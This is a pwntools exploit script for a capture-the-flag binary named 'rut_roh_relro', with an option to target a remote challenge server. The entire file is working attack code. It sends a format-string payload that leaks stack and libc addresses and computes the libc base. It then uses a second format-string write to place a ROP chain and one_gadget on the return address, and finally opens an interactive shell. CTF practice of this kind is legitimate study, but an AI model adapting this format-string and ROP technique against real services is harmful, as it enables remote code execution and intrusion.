from pwn import *

import argparse

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--debug', action='store_true')
    parser.add_argument('--remote', action='store_true')
    args = parser.parse_args()

    context.terminal = ['tmux', 'splitw', '-h']
    elf = context.binary = ELF('./rut_roh_relro')

    leaker = b"%62$018p%75$018p%66$018p"

    def exec_fmt(payload):
        p = process()
        p.sendline(payload)
        p.sendline(b'A')
        return p.recvall()
    fmt_str = FmtStr(exec_fmt)

    if args.remote:
        io = remote('lac.tf', 31134)
    elif args.debug:
        io = gdb.debug(context.binary.path, '''
        set follow-fork-mode child
        break main
        continue
        ''')
    else:
        io = process()  # Actually start running the process

    io.sendline(leaker)

    io.recvuntil(b'latest post:\n')
    stack_leak = int(io.recvn(18), 16)
    init_cacheinfo_leak = int(io.recvn(18), 16) - 287
    main_before_fgets_leak = int(io.recvn(18), 16) - 0x90
    ret_stack_addr = stack_leak + 33
    libc_base = init_cacheinfo_leak - 0x236b0
    print('stack leak: ', hex(stack_leak))
    print('ret stack addr: ', hex(ret_stack_addr))
    print('init cache info leak: ', hex(init_cacheinfo_leak))
    print('libc base: ', hex(libc_base))
    print('main before fgets leak: ', hex(main_before_fgets_leak))

    libc = elf.libc
    libc.address = libc_base
    rop = ROP([elf, libc])

    binsh = next(libc.search(b'/bin/sh'))
    rop.execve(binsh, 0, 0)
    chain = rop.chain()

    one_gadget = 0xc9620

    writes = {
        ret_stack_addr: rop.rsi.address,
        ret_stack_addr + 8: 0,
        ret_stack_addr + 16: rop.rdx.address,
        ret_stack_addr + 24: 0,
        ret_stack_addr + 32: libc_base + one_gadget
    }

    payload = fmtstr_payload(fmt_str.offset, writes)
    print(writes, payload, len(payload))
    io.sendline(payload)

    io.sendline(b'A')

    io.interactive()
